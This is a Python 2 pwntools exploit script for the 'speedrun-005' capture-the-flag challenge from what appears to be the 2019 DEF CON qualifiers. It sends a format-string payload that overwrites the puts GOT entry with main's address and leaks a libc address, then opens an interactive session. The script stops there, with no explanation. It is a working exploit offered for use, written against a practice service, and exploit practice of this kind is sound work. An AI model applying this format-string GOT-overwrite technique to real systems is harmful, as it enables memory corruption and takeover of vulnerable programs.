#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('speedrun-005')

host = args.HOST or 'speedrun-005.quals2019.oooverflow.io'
port = int(args.PORT or 31337)

env= {'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'}
def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env,gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv,env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x400701
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'split', '-h']
io = start()
io.recv()
offset = 138135

main = 0x400729
target = exe.got['puts']
target2 = target+2
payload = "AA%141$8llx%{}x%{}$n%{}x%{}$hn{}{}".format(0x0040 - 9 - 5, 10, 0x0729 - 0x40, 11, p64(target2), p64(target))

io.sendline(payload)
io.recvuntil('AAAA')
addr = int(io.recvline().strip(), 16) - offset
log.info(hex(addr))


io.interactive()

